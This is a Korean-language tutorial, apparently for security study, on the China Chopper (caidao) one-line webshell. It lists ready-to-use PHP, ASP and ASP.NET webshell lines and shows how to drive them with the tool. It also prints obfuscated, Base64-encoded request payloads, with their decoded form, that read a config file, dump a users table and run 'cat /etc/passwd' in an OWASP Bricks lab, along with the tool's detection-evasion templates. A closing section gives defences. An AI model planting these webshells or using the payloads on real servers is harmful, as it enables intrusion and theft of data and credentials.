# Caidao-20160620 툴을 이용한 One Line WebShell


| 작성자       | 강하늘 사원   |
| --------- | ---------------- |
| **작성 일자** | **2024년 4월 18일
** |
| **수정 일자** |                  |
| **비고**    |                  |

</br>

## ( 1 ) One Line WebShell
   
      PHP     :    <?php @eval($_POST['koromoon']);?>
      ASP     :    <%eval request("koromoon")%>
      ASP.NET :    <%@ Page Language="Jscript"%><%eval(Request.Item["koromoon"],"unsafe");%>

피해자 웹서버에 한 줄짜리 코드를 삽입한 후 공격자가 실행하고자 하는 코드를 전송하여 결과값을 얻는 웹쉘을 말함.
웹쉘 파일을 업로드하거나 특정 페이지에 실행 가능한 코드 한 줄을 삽입하면 됨.
삽입된 코드는 탐지하기 매우 어려움. 더군다나 우회 기법을 사용하면 더더욱 탐지하기 어려움.

## ( 2 ) One Line WebShell 공격 순서도

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/cbda7b72-37fc-409d-8757-98ad964d64e9)

< 공격 순서도 >


## ( 3 ) caidao 툴

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/0c4fcfe4-b145-4133-b83f-e9a8bd7a1cbf)

< caidao 메인 화면 >

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/4f50bd80-83d6-441e-958a-082ea3a1169e)

< caidao 구성 파일 >

사용법이 간단한 POST 기반 One Line WebShell 툴로 중국 툴임.
최신 버전(20160620)에는 기존 버전과 다르게 설정 파일(caidao.conf)을 추가하여 실행 코드에 대한 우회 기법을 추가 및 수정 가능하며 Response 에 따른 고유의 FLAG 문자열을 바꿀 수 있음.
또한, HTTP 헤더의 User-Aget 필드값도 수정 가능함.

참고로 기존 FLAG 문자열은 "->|" 와 "|<-" 로 설정 파일이 없는 관계로 수정 불가능함.
그래서 해당 문자열을 가지고 보안장비 탐지룰를 등록하여 탐지하도록 할 수 있었으나 최신 버전에서는 공격자가 원하는 FLAG 문자열로 바꿀 수 있음.
(최신 버전 디폴트 FLAG 문자열 : X@Y, 3 글자 선에서 원하는 문자열로 변경 가능함)

caidao 관련 파일들 중에 몇 가지 파일의 용도는 아래와 같음.
caidao.conf - 설정 파일
CCC 폴더 - 플러그인 폴더



## ( 4 ) caidao 툴 사용법

1. 상단 메뉴


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/7536b627-0618-4dd1-8a91-aa3354aced5e)

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/30f016a0-8de7-43cf-833e-73275f696f25)

2. 오른쪽 상태바


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/88036980-dd0b-431d-8963-5524cdd3e668)

Site Type 는 피해자 웹서버를 그룹별로 나눠서 관리 가능함.
자신이 원하는 이름으로 Site Type 을 만들고 등록, 수정, 삭제가 가능함.

3. 피해자 웹서버 등록


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/c60a5d4c-6336-4e91-9ce7-0a9e0f02520d)

원하는 Site Type 에 피해자 웹서버를 등록함.
업로드 주소 옆에 eval 함수의 변수값 등록함. (포트 번호 X)
웹 언어는 서버 사이드 스크립트로 eval 함수의 변수명은 공격자만 알 수 있으므로 일종의 패스워드임.

4. 오른쪽 마우스 기능


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/d2175fb7-bb7f-46ce-9136-3c36ea1c64f5)

iles Management - 피해자 웹서버에 파일 업로드, 다운로드 가능
Database Management - 피해자 웹서버 DB에 원하는 쿼리 입력 가능 (단, DB 접속 정보를 알아야 함)
Virtual Terminal - 터미널 기능

5. Files Management


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/e2583d66-d526-404b-8e7d-fd86baea3382)

기본적인 기능은 다 갖추고 있으며 Modify the file time 기능은 타임 스탬프를 수정하는 기능으로 웹쉘 파일을 찾을 때 시간대를 가지고 탐지하는 것을 회피함.

6. Database Management


![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/73c2b4a2-3f32-4bb8-84eb-1e9e7399fda6)

Config 버튼을 클릭하여 피해자 웹서버 DB정보 입력함.

아래 내용은 Database Management 설정값 관련 정보임.


      PHP            :
      <T>입력</T>                <--- MYSQL, MSSQL, ORACLE, INFOMIX, POSTGRESQL 하나의 유형
      <H>호스트 주소<H>          <--- 컴퓨터 이름 또는 IP 주소 (ex. localhost)
      <U>데이터베이스 사용자</U> <--- 데이터베이스를 연결하는 사용자 이름 (ex. root)
      <P>데이터 베이스 암호</P>  <--- 데이터베이스 연결을 위한 암호 (ex. 123455)
      <N>기본 라이브러리</N>     <--- 연결 기본 라이브러리 이름

      <L>utf8</L>                <--- PHP 옵션으로 MYSQL 데이터베이스 유형 선택 (단, latin1 은 기입 X)

      ASP 및 ASP.NET :
      <T>유형</T>                <--- ADO 기재
      <C>ADO 구성 정보</C>       <--- MSSQL 구성 정보
              Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456;

      사용자 정의    :
      <T>유형</T>                <--- XDB 만 기재
      <X>사용자가 정의한 구성 정보</X> <--- Customize.jsp 와 같이 데이터베이스 매개 변수 작성 (두 줄)
      MSSQL          :
              <X>
              com.microsoft.sqlserver.jdbc.SQLServerDriver
              jdbc:sqlserver://127.0.0.1:1433;databaseName=test;user=sa;password=123456
              </X>
        MYSQL          :
              <X>
              com.mysql.jdbc.Driver
              jdbc:mysql://localhost/test?user=root&password=123456
              </X>
        ORACLE         :
              <X>
              oracle.jdbc.driver.OracleDriver
              jdbc:oracle:thin:user/password@127.0.0.1:1521/test
              </X>

## ( 5 ) caidao 툴을 이용한 One Line WebShell 실습

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/3b4ff41c-ebe6-4179-84a1-0eb1d8e76312)

< 웹쉘 파일 >

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/ece70bee-567d-42d9-9dd3-f5f4659fb90a)

< 웹쉘 업로드 >


owaspbwa 의 OWASP Bricks 웹 어플리케이션(PHP + MySQL + Linux)에서 실습함.
웹쉘 코드 : <?php @eval($_POST['koromoon']);?>
웹쉘 업로드 링크 : http://192.168.100.133/owaspbricks/upload-1/uploads/webshell.php



1. DB 정보 관련 파일 다운로드 (LocalSettings.php)
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/05664bdb-1aa9-4e8c-af46-65938eea79e7)

< caidao 툴에서 LocalSettings.php 파일 다운로드 >

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/17f8361d-4906-4703-80cb-f514066c403c)

< LocalSettings.php 파일 다운로드 시 패킷덤프 >

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/30dc7418-8c69-4586-ac57-4aa0667fb650)

< LocalSettings.php 파일 내용 >



      koromoon=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc".
      "OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZ
      V9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1l
      KDApO307ZWNobygiWEBZIik7JEY9Ii9vd2FzcGJ3YS9vd2FzcGJyaWNrcy1zdm4vTG9jYWxTZXR0aW5
      ncy5waHAiOyRmcD1AZm9wZW4oJEYsJ3InKTtpZihAZmdldGMoJGZwKSl7QGZjbG9zZSgkZnApO0ByZW
      FkZmlsZSgkRik7fWVsc2V7ZWNobygnRVJST1I6Ly8gQ2FuIE5vdCBSZWFkJyk7fTtlY2hvKCJYQFkiK
      TtkaWUoKTs%3D'));\");"));

      ↓ Request 패킷 중에서 Base64 문자열 디코딩

      @ini_set("display_errors", "0");
      @set_time_limit(0);
      if (PHP_VERSION < '5.3.0') {
          @set_magic_quotes_runtime(0);
      };
      echo("X@Y");
      $F = "/owaspbwa/owaspbricks-svn/LocalSettings.php";
      $fp = @fopen($F, 'r');
      if (@fgetc($fp)) {
          @fclose($fp);
          @readfile($F);
      } else {
          echo('ERROR:// Can Not Read');
      };
      echo("X@Y");
      die();

2. 개인정보 확인 (Bricks 유저 정보)
![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/1ffadb14-b427-496b-b84a-f3e3cd40704c)

< caidao 툴에서 Bricks 유저 정보 확인 >

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/adc8c5e3-b8a5-4c56-97aa-1df0ce68866b)

< Bricks 유저 정보 확인 시 패킷 덤프 >


      koromoon=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc".
      "OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZ
      V9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1l
      KDApO307ZWNobygiWEBZIik7JGhzdD0nbG9jYWxob3N0JzskdXNyPSdicmlja3MnOyRwd2Q9J2JyaWN
      rcyc7JGRibj0nYnJpY2tzJzskc3FsPSdTRUxFQ1QgKiBGUk9NIGB1c2Vyc2AgT1JERVIgQlkgMSBERV
      NDIExJTUlUIDAsMjAnOyRUPW15c3FsaV9jb25uZWN0KCRoc3QsJHVzciwkcHdkLCRkYm4pO2lmKG15c
      3FsaV9jb25uZWN0X2Vycm5vKCRUKSl7ZWNobyAiRVJST1I6Ly8gIi5teXNxbGlfY29ubmVjdF9lcnJv
      cigpO31lbHNleyRxPW15c3FsaV9xdWVyeSgkVCwkc3FsKTtpZigkcSl7JGsgPSAwO3doaWxlICgkZml
      uZm8gPSBAbXlzcWxpX2ZldGNoX2ZpZWxkKCRxKSl7ZWNobyAkZmluZm8tPm5hbWUuIlx0fFx0Ijskay
      srO31pZigkaz4wKXtlY2hvICJcclxuIjt3aGlsZSgkcnM9QG15c3FsaV9mZXRjaF9yb3coJHEpKXtmb
      3IoJGM9MDskYzwkazskYysrKXtlY2hvICRyc1skY10uIlx0fFx0Ijt9ZWNobyAiXHJcbiI7fX1lbHNl
      e2VjaG8gICJSZXN1bHRcdHxcdFxyXG5FeGVjdXRlIFN1Y2Nlc3NmdWxseSFcdHxcdFxyXG4iO319ZWx
      zZXtlY2hvICAiUmVzdWx0XHR8XHRcclxuRVJST1I6ICIubXlzcWxpX2Vycm9yKCRUKS4iXHR8XHRccl
      xuIjt9bXlzcWxpX2Nsb3NlKCRUKTt9O2VjaG8oIlhAWSIpO2RpZSgpOw%3D%3D'));\");"));

      ↓ Request 패킷 중에서 Base64 문자열 디코딩

      @ini_set("display_errors", "0");
      @set_time_limit(0);
      if (PHP_VERSION < '5.3.0') {
          @set_magic_quotes_runtime(0);
      };
      echo("X@Y");
      $hst = 'localhost';
      $usr = 'bricks';
      $pwd = 'bricks';
      $dbn = 'bricks';
      $sql = 'SELECT * FROM `users` ORDER BY 1 DESC LIMIT 0,20';
      $T = mysqli_connect($hst, $usr, $pwd, $dbn);
      if (mysqli_connect_errno($T)) {
            echo "ERROR:// ".mysqli_connect_error();
      } else {
          $q = mysqli_query($T, $sql);
          if ($q) {
              $k = 0;
              while ($finfo = @mysqli_fetch_field($q)) {
                  echo $finfo - > name.
                  "\t|\t";
                  $k++;
              }
              if ($k > 0) {
                  echo "\r\n";
                  while ($rs = @mysqli_fetch_row($q)) {
                      for ($c = 0; $c < $k; $c++) {
                          echo $rs[$c].
                          "\t|\t";
                      }
                      echo "\r\n";
                  }
              } else {
                  echo "Result\t|\t\r\nExecute Successfully!\t|\t\r\n";
              }
          } else {
              echo "Result\t|\t\r\nERROR: ".mysqli_error($T).
              "\t|\t\r\n";
          }
          mysqli_close($T);
      };
      echo("X@Y");
      die();

3. cat /etc/passwd 명령어 입력

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/91c2da3e-2ef7-4c1f-a10b-d4b3112894c3)

< caidao 툴에서 cat /etc/passwd 명령어 결과값 >

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/cb9f5f8d-20f7-4544-af2e-71d4a7a827a9)

< cat /etc/passwd 명령어 입력 시 패킷 덤프 >



      koromoon=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc".
      "OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZ
      V9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1l
      KDApO307ZWNobygiWEBZIik7JG09Z2V0X21hZ2ljX3F1b3Rlc19ncGMoKTskcD0nL2Jpbi9zaCc7JHM
      9J2NkIC9vd2FzcGJ3YS9vd2FzcGJyaWNrcy1zdm4vdXBsb2FkLTEvdXBsb2Fkcy87Y2F0IC9ldGMvcG
      Fzc3dkO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXSc7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJT
      EVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI%2FIi1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XC
      IiOyRyPSJ7JHB9IHskY30iOyRhcnJheT1hcnJheShhcnJheSgicGlwZSIsInIiKSxhcnJheSgicGlwZ
      SIsInciKSxhcnJheSgicGlwZSIsInciKSk7JGZwPXByb2Nfb3Blbigkci4iIDI%2BJjEiLCRhcnJheS
      wkcGlwZXMpOyRyZXQ9c3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pO3Byb2NfY2xvc2UoJGZwK
      TtwcmludCAkcmV0OztlY2hvKCJYQFkiKTtkaWUoKTs%3D'));\");"));

      ↓ Request 패킷 중에서 Base64 문자열 디코딩

      @ini_set("display_errors", "0");
      @set_time_limit(0);
      if (PHP_VERSION < '5.3.0') {
            @set_magic_quotes_runtime(0);
      };
      echo("X@Y");
      $m = get_magic_quotes_gpc();
      $p = '/bin/sh';
      $s = 'cd /owaspbwa/owaspbricks-svn/upload-1/uploads/;cat /etc/passwd;echo [S];pwd;echo [E]';
      $d = dirname($_SERVER["SCRIPT_FILENAME"]);
      $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
      $r = "{$p} {$c}";
      $array = array(array("pipe", "r"), array("pipe", "w"), array("pipe", "w"));
      $fp = proc_open($r.
          " 2>&1", $array, $pipes);
      $ret = stream_get_contents($pipes[1]);
      proc_close($fp);
      print $ret;;
      echo("X@Y");
      die();

위 3 가지 실습을 가지고 분석한 결과, 웹쉘 eval 함수의 변수명에 실직적인 공격 코드를 우회적인 기법과 Base64 인코딩한 후 전송하여 실행된 결과값을 얻음.

아래 내용은 caidao.conf 파일에서 확인한 각 웹 언어에 따른 Request 기본 전송 폼임.



      // PHP_BASE 매개 변수 : %s
      <PHP_BASE>
      array_map("ass"."ert",array("ev"."Al(\"\\\$xx%%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";
      @ev"."al(\\\$xx('%s'));\");"));
      </PHP_BASE>

      // ASP_BASE 매개 변수 : %s %s %s 这里有个bd函数用于HEX解码
      <ASP_BASE>
      %%u0045%%xec%%ute%%G%%loba%%l%%%%28Replace%%28%%22Fu%%nct%%ion%%20bd%%28by%%V%%a
      l%%20s%%29:Fo%%r%%20i%%%%3D1%%20T%%o%%20Le%%n%%28s%%29%%20S%%te%%p%%202:c%%%%3DM
      %%id%%28s%%2Ci%%2C2%%29:If%%20Is%%Nu%%meric%%28M%%id%%28s%%2Ci%%2C1%%29%%29%%20T
      %%hen:bd%%%%3Dbd%%4026%%40c%%hr%%28%%22%%22%%4026%%40H%%22%%22%%4026%%40c%%29:E%
      %lse:bd%%%%3Dbd%%4026%%40c%%hr%%28%%22%%22%%4026%%40H%%22%%22%%4026%%40c%%4026%%
      40M%%id%%28s%%2Ci%%2B2%%2C2%%29%%29:i%%%%3Di%%2B2:E%%nd%%20If:Ne%%xt:E%%nd%%20Fu
      %%nct%%ion:E%%xecu%%te%%%%28bd%%%%28%%22%%224F6E204572726F7220526573756D65204E65
      78743A526573706F6E73652E57726974652022%s223A%s3A526573706F6E73652E57726974652022
      %s223A526573706F6E73652E456E64%%22%%22%%29%%%%29%%22%%2C%%22%%4026%%40%%22%%2Cch
      r%%2838%%29%%29%%29
      </ASP_BASE>

      // ASPX_BASE 매개 변수 : %s,%d,%s,%s
      <ASPX_BASE>
      %%u0052%%u0065sponse%%u002E%%u0057rit%%u0065("%s");var %%u0065rr:%%u0045xc%%u006
      5ption;%%u0074ry%%u007B%%u0065val(Syst%%u0065m%%u002ET%%u0065xt%%u002E%%u0045nco
      ding%%u002EG%%u0065t%%u0045ncoding(%d)%%u002EG%%u0065tString(Syst%%u0065m.Conv%%
      u0065rt%%u002EFromBas%%u006564String("%s")),"unsaf%%u0065");
      %%u007Dcatch(err)%%u007B%%u0052esponse%%u002E%%u0057rite("ER"%%2B"ROR://"%%2Berr
      .message);%%u007D%%u0052%%u0065sponse.%%u0057rit%%u0065("%s");%%u0052espons%%u00
      65.%%u0045nd();
      </ASPX_BASE>



## ( 6 ) One Line WebShell 방어법

보통 보안장비에 탐지 정책을 넣을 때 행위 시 발생되는 고유한 시그니처를 기반으로 둔 PCRE 형태로 탐지 정책을 설정함.
그러나 caidao 최신 버전(20160620)에서는 공격자가 원하는 우회 기법을 이용해서 설정 파일(caidao.conf)을 수정 적용해서 공격이 가능하므로 고유한 시그니처를 얻기 힘들 수 있음.
파일 업로드 취약점이라든지 코드 삽입 취약점이 존재하지 않도록 시큐어 코딩하거나 웹 서버의 PHP 파일들의 고유 MD5 값을 저장하여 수시로 변조되거나 새로 생긴 파일이 있는지 여부를 확인하는게 제일 좋은 방법임.
타임 스탬프 확인은 좋은 방법이긴 하나 공격자가 변조가 가능함.

참고로 아래 명령어는 현재 폴더 및 하위폴더의 모든 PHP 파일 중에서 위험한 함수명을 검색하여 웹쉘 파일을 찾는 명령어로 해당 파일 경로를 표시해줌.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/ead5ea13-5626-49e4-ba13-5e8c5268dafe)

find . -name \*.php | xargs grep eval
eval 대신 system, exec, passthru, escapeshellcmd, pcntl_exec, shell_exec, proc_open, popen, curl_exec, curl_multi_exec, parse_ini_file, show_source 등을 넣어서 확인함.

또한, 위 위험한 함수명들을 사용하지 못하도록 php.ini 파일 내에서 disabled_function 옵션에 추가하면 됨.

위 로그 검색은 리눅스 환경에서 가능하며 disabled_function 옵션 설정은 PHP 어플리케이션에서만 가능함.
타 OS 및 웹 언어 어플리케이션에 따른 웹쉘 방어법은 추가로 공부해야 함.
워낙에 방대한 분야라 하루 내로 끝내기는 어려울 듯 함.

</br>


##### 원작자: 문광일 PM
##### 링크: [KOROMOON][koromoonlink]
[koromoonlink]: https://koromoon.blogspot.com/2020/02/caidao-20160620-one-line-webshell.html "Go koromoon"</br>

참고 사이트 : 

https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html
https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html
http://informationonsecurity.blogspot.kr/2012/11/china-chopper-webshell.html
https://blog.lael.be/post/158
